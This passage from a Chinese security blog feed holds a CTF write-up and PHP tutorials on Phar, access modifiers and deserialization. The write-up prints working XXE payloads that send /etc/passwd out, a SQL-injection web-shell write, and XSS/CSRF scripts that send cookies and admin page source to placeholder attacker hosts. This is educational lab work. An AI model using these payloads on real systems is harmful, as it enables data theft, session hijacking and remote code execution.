class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line"> &lt;!DOCTYPE foo [  </span><br><span class="line">   &lt;!ELEMENT svg ANY &gt;</span><br><span class="line">   &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;yourip&#x2F;xxe.dtd&quot; &gt;</span><br><span class="line">%remote;%data;</span><br><span class="line">   ]&gt;</span><br><span class="line">   &lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">   &amp;res;</span><br><span class="line">   &lt;&#x2F;svg&gt;</span><br><span class="line">  </span><br><span class="line">xxe.dtd</span><br><span class="line">&lt;!ENTITY % show SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;</span><br><span class="line">&lt;!ENTITY % data &quot;&lt;!ENTITY res SYSTEM &#39;http:&#x2F;&#x2F;yourip:your port&#x2F;?%show;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后建立一个http服务监听数据，</p><p><img src="/images/image-20200619215906958.png" alt="image-20200619215906958"></p><p>请求xxe.svg</p><p><img src="/images/image-20200620102634408.png" alt="image-20200620102634408"></p><p>可以看到已经读出来了/etc/passwd的内容</p><p><img src="/images/image-20200619220044010.png" alt="image-20200619220044010"></p><p>那么我们就可以开始读数据了，根据提示用户r1ck的历史操作我们读/home/r1ck/.bash_history文件内容</p><p><img src="/images/image-20200619220254637.png" alt="image-20200619220254637"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;app</span><br><span class="line">php -S 0.0.0.0:8080</span><br></pre></td></tr></table></figure><p>得知在app目录下开启了一个php的web服务，那么读取index.php的源码</p><p><img src="/images/image-20200620102802726.png" alt="image-20200620102802726"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;index&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">Hi!</span><br><span class="line">You Find Me .</span><br><span class="line">Flag is nearby.</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$conn&#x3D;mysql_connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;&#39;);</span><br><span class="line">mysql_select_db(&#39;security&#39;);</span><br><span class="line"></span><br><span class="line">if ($_GET[&#39;id&#39;])&#123;</span><br><span class="line">    $id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">    $id &#x3D; 1;</span><br><span class="line">$sql &#x3D; &quot;select * from user where id&#x3D;&#39;$id&#39;&quot;;</span><br><span class="line">$result &#x3D; mysql_query($sql,$conn);</span><br><span class="line">$arr &#x3D; mysql_fetch_assoc($result);</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>存在sql注入，并且hint2提示直接getshell，可以union联合使用into outfile写入shell</p><p><code>-1&#39; union select 1,&#39;&lt;?php system($_GET[cmd]);?&gt;&#39; into outfile&#39;/app/shell.php&#39;#</code></p><p>但直接写的话进不去，那么hex编码一下，由于是get请求，也url处理一下</p><p><code>-1%27%20union%20select%201,0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e%20into%20outfile%27/app/blacknight.php%27%23</code></p><p>这里要说一下，开始我写/app/shell.php都不成功，或许是文件存在了写不了？反正自己写个其他的文件名就行了</p><p><img src="/images/image-20200620101653615.png" alt="image-20200620101653615"></p><p>解码全是师傅们的shell，还有个H3re_1s_y0ur_f14g.php</p><p>那么cat读取</p><p><img src="/images/image-20200620101831229.png" alt="image-20200620101831229"></p><h4 id="fake-phpminiadmin"><a href="#fake-phpminiadmin" class="headerlink" title="fake phpminiadmin"></a>fake phpminiadmin</h4><p>sql输入框存在xss，将payload hex编码后可触发</p><p><img src="/images/image-20200619232118432.png" alt="image-20200619232118432"></p><p>提示</p><p><img src="/images/image-20200619233403673.png" alt="image-20200619233403673"></p><p>考点：content处csrf</p><p>拿xss平台的的payload改一下把数据传到自己的ecs上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;(function()&#123;(new Image()).src&#x3D;&#39;http:&#x2F;&#x2F;yourip:yourport&#x2F;index.php?do&#x3D;api&amp;id&#x3D;XI0O1O&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)());&#125;)();&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>然后貌似可以拿burp生成csrf的payload，以后研究一下，这里直接拿官方的，在ecs上创建一个xss.php，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;sql&quot; value&#x3D;&quot;select 0x hex后上述payload&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;script&gt;document.forms[0].submit();&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>创建好之后在ecs上开启一个python http服务等着</p><p>回到靶机，在content处输入xss.php的请求地址</p><p><img src="/images/image-20200620114327075.png" alt="image-20200620114327075"></p><p>递交需要code，md5之后前六位为75d8be，脚本爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(md5_val)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">999999</span>, <span class="number">100000000</span>):</span><br><span class="line">        md5_value=hashlib.md5(str(x)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_value[:<span class="number">6</span>]==md5_val:</span><br><span class="line">            <span class="keyword">return</span> str(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> func(<span class="string">'75d8be'</span>)</span><br><span class="line">    //<span class="number">6042761</span></span><br></pre></td></tr></table></figure><p>我们递交之后管理员访问content的内容，之后触发构造好的xss并在sql输入框自动提交表单，管理员的cookie等内容就被带出来了。</p><p>提交我们可以看到ecs上已经返回数据了</p><p><img src="/images/image-20200620114518271.png" alt="image-20200620114518271"></p><p>我们可以看到带出了后台地址，这里可以参考<a href="https://www.cnblogs.com/afanti/p/8277344.html" target="_blank" rel="noopener">这位师傅</a>的帖子构造payload获取后台源码</p><p>构造</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createXmlHttp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">        xmlHttp = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> MSXML = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">'MSXML2.XMLHTTP.5.0'</span>, <span class="string">'MSXML2.XMLHTTP.4.0'</span>, <span class="string">'MSXML2.XMLHTTP.3.0'</span>, <span class="string">'MSXML2.XMLHTTP'</span>, <span class="string">'Microsoft.XMLHTTP'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; MSXML.length; n++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                xmlHttp = <span class="keyword">new</span> ActiveXObject(MSXML[n]);</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">createXmlHttp();</span><br><span class="line">xmlHttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xmlHttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        code=<span class="built_in">escape</span>(xmlHttp.responseText);</span><br><span class="line">        createXmlHttp();</span><br><span class="line">        url = <span class="string">"http://ip:port"</span>; <span class="comment">//这里是服务器接受的地址</span></span><br><span class="line">        cc = <span class="string">"htmlcode="</span> + code +<span class="string">"&amp;filename=index.html"</span>;</span><br><span class="line">        xmlHttp.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</span><br><span class="line">        xmlHttp.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">        xmlHttp.setRequestHeader(<span class="string">"Referer"</span>, <span class="string">"http://127.0.0.1/"</span>);</span><br><span class="line">        xmlHttp.setRequestHeader(<span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=tjuhvnkki74v7qf4lfp41li347"</span>);</span><br><span class="line">        xmlHttp.send(cc)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlHttp.open(<span class="string">"GET"</span>, <span class="string">"/admin_shark.php"</span>, <span class="literal">true</span>);<span class="comment">//这块填写获得的后台地址。</span></span><br><span class="line">xmlHttp.setRequestHeader(<span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=tjuhvnkki74v7qf4lfp41li347"</span>);</span><br><span class="line">xmlHttp.send(<span class="literal">null</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>同样hex编码之后放到xss.php中，然后content请求</p><p>这里换成nc监控</p><p><img src="/images/image-20200620120034995.png" alt="image-20200620120034995"></p><p>得到源码以及flag</p><p><img src="/images/image-20200620120153097.png" alt="image-20200620120153097"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phar以及phar对象注入</title>
      <link href="/2020/06/02/Phar/"/>
      <url>/2020/06/02/Phar/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是phar"><a href="#什么是phar" class="headerlink" title="什么是phar"></a>什么是phar</h4><blockquote><p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。</p><a id="more"></a><p>每个归档都包含三个部分：</p><ol><li>存根(Stub) —— 一个可以引导归档的PHP文件。存根必须包含<code>__HALT_COMPILER();</code>语句，并且默认存根拥有在不启用PHAR扩展的情况下运行PHAR文件的能力。</li><li>清单 —— 清单详细说明了存归档的内容。</li><li>文件内容 —— 归档中包含的原始文件</li></ol><p>另外，PHAR格式还可以包括用于验证PHAR完整性的签名。</p></blockquote><p>Phar 归档可由 PHP 本身处理，因此不需要使用额外的工具来创建或使用，使用php脚本就能创建或提取它。</p><h4 id="生成一个phar文件"><a href="#生成一个phar文件" class="headerlink" title="生成一个phar文件"></a>生成一个phar文件</h4><p>首先开启php.ini的phar扩展</p><p><img src="/images/image-20200602174306490.png" alt="image-20200602174306490"></p><p>示例：</p><p>创建两个文件如下</p><p><img src="/images/image-20200602181914631.png" alt="image-20200602181914631"></p><p>createphar.php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);<span class="comment">//生成新的phar文件</span></span><br><span class="line">$phar-&gt;buildFromDirectory(<span class="keyword">__DIR__</span>.<span class="string">'\\'</span>);<span class="comment">//源码目录</span></span><br><span class="line"><span class="comment">//$phar-&gt;compressFiles(Phar::GZ);可以选择添加压缩方式</span></span><br><span class="line">$phar-&gt;setStub($phar-&gt;createDefaultStub(<span class="string">'index.php'</span>));<span class="comment">//设置存根，没有设置这个存根文件的话，默认寻找的文件为index.php。</span></span><br></pre></td></tr></table></figure><p>生成</p><p><img src="/images/image-20200602183306239.png" alt="image-20200602183306239"></p><p>我们可以直接加载phar文件的单独文件：</p><p><img src="/images/image-20200602183654213.png" alt="image-20200602183654213"></p><p><img src="/images/image-20200602183718537.png" alt="image-20200602183718537"></p><p>当然也能还原(无压缩方式)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar-&gt;extractTo(<span class="string">'huanyuan'</span>);<span class="comment">//路径</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20200602184946407.png" alt="image-20200602184946407"></p><h4 id="phar对象注入"><a href="#phar对象注入" class="headerlink" title="phar对象注入"></a>phar对象注入</h4><p>PHP文件操作允许使用各种URL协议去访问文件路径如data://，zlib://，或php://，phar://也是其中一种。</p><h5 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h5><p>Phar文件可以包含序列化格式的元数据，<a href="https://www.freebuf.com/articles/web/182231.html" target="_blank" rel="noopener">扒张图</a></p><p><img src="https://image.3001.net/images/20180827/1535343254_5b837a96d90ac.png!small" alt="1.png"></p><p>所以如果我们通过 phar:// 对我们现有的Phar文件执行文件操作，则其序列化元数据将被反序列化。假如攻击者可以在<code>ìnclude()</code>，<code>fopen()</code>，<code>file_get_contents()</code>，<code>file()</code>等操作中控制完整的文件路径，就可以通过<code>phar://</code>注入并获得代码执行，造成严重的安全漏洞。</p><p>实战：<a href="https://blog.csdn.net/qq_43756333/article/details/106503047" target="_blank" rel="noopener">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中的public、protected、private</title>
      <link href="/2020/05/26/note13/"/>
      <url>/2020/05/26/note13/</url>
      
        <content type="html"><![CDATA[<p>区别一下public，protected和private</p><a id="more"></a><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>public，protected和private称为“访问修饰符”，可以通过在声明前加上这些关键字来定义属性，方法或常量的可见性。</p><p>public：公有类型，可以在任何地方访问。</p><p>protected：受保护类型，只能在类本身内以及继承和父类中访问。</p><p>private：私有类型，只能由定义该成员的类访问。该类型的属性或方法只能在该类中使用，在该类的实例、子类中、子类的实例中都不能               调用私有类型的属性和方法</p><p>举几个例子。</p><p>1.Public</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pub</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $message = <span class="string">"你看见了我"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;message.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pub类的子类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child</span> <span class="keyword">extends</span> <span class="title">pub</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;message;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> child;</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;message.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$obj-&gt;display();<span class="comment">//类内</span></span><br><span class="line">$obj-&gt;show();<span class="comment">//子类</span></span><br><span class="line">    <span class="comment">//都可调用</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20200526161822746.png" alt="image-20200526161822746"></p><p>2.protected</p><p>把public改成protected，编译器提示：</p><p><img src="/images/image-20200526163125793.png" alt=""></p><p> 通过父类类型的变量,是不允许访问protected成员的。只调用其本身和子类则正常输出。</p><p><img src="/images/image-20200526165538604.png" alt="image-20200526165538604"></p><p>3.private</p><p>再改为private</p><p><img src="/images/image-20200526165749359.png" alt="image-20200526165749359"></p><p>只能由定义该成员的类访问，由于它只对类的内部成员可见，所以要利用它，一般都会是写一个public的方法，再返回这个属性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pri</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $a = <span class="string">'self'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $other = <span class="keyword">new</span> <span class="keyword">self</span>();</span><br><span class="line">        $other-&gt;a = <span class="string">'这样你才能看见我'</span>;</span><br><span class="line">        var_dump($other-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> pri();</span><br><span class="line">$obj-&gt;test();</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200526171317806.png" alt="image-20200526171317806"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化初总结</title>
      <link href="/2020/05/23/note12/"/>
      <url>/2020/05/23/note12/</url>
      
        <content type="html"><![CDATA[<p>碰到过很多次反序列化的审计，一直都没系统地去看，这两天看了不少博客，自己小小总结一下。</p><a id="more"></a><h3 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h3><p>序列化把一个对象变成可存储，可传输的字符串，并且在转换过程中保存变量的值和数据格式，反序列化把序列化后的字符串还原回对象使用，通过这个过程，可以方便数据的传输和存储，使程序更具维护性。</p><p>对于PHP反序列化的过程，我们主要围绕两个函数：serialize()，unserialize()。</p><p>那么为什么会产生PHP反序列化漏洞利用呢，这就要讲到PHP中几个特殊函数了。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>在PHP的语法中，有一些系统自带的方法名，均以双下划线开头，它们会在特定的情况下被调用，即所谓的魔法函数。常见的魔术方法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct：在创建对象时候初始化对象，一般用于对变量赋初值。</span><br><span class="line">__destruct：和构造函数相反，当对象所在函数调用完毕后执行。</span><br><span class="line">__toString：当对象被当做一个字符串使用时调用。</span><br><span class="line">__sleep: 序列化对象之前就调用此方法(其返回需要一个数组)</span><br><span class="line">__wakeup: 反序列化恢复对象之前调用该方法</span><br><span class="line">__call:  当调用对象中不存在的方法会自动调用该方法。</span><br><span class="line">__get:   在调用私有属性的时候会自动执行</span><br><span class="line">__isset()： 在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line">__unset()： 在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_42751456/article/details/88758908" target="_blank" rel="noopener">这位师傅</a>的例子可以清晰的看到这些函数被调用的情况:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $variable = <span class="string">'BUZZ'</span>;</span><br><span class="line">    <span class="keyword">public</span> $variable2 = <span class="string">'OTHER'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printvariable</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;variable.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__construct'</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__destruct'</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__wakeup'</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'__sleep'</span>.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'variable'</span>,<span class="string">'variable2'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个对象，回调用__construct</span></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line"><span class="comment">//序列化一个对象，会调用__sleep</span></span><br><span class="line">$serialized = serialize($object);</span><br><span class="line"><span class="comment">//输出序列化后的字符串</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Serialized:'</span>.$serialized.<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="comment">//重建对象，会调用__wakeup</span></span><br><span class="line">$object2 = unserialize($serialized);</span><br><span class="line"><span class="comment">//调用printvariable,会输出数据(BUZZ)</span></span><br><span class="line">$object2-&gt;printvariable();</span><br><span class="line"><span class="comment">//脚本结束，会调用__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20200523140420068.png" alt="image-20200523140420068"></p><p>由此我们可以设想，如果服务器没对我们提交的序列化字符串进行检测，直接将变量放到这些魔术方法中，那么我们是不是可以控制反序列化进程，从而达到代码执行，getshell的目的呢，答案是肯定的。一道<a href="https://www.freebuf.com/column/161798.html" target="_blank" rel="noopener">这位师傅</a>的例子。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Example</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $handle;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;shutdown();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shutdown</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Process</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $pid;</span><br><span class="line">        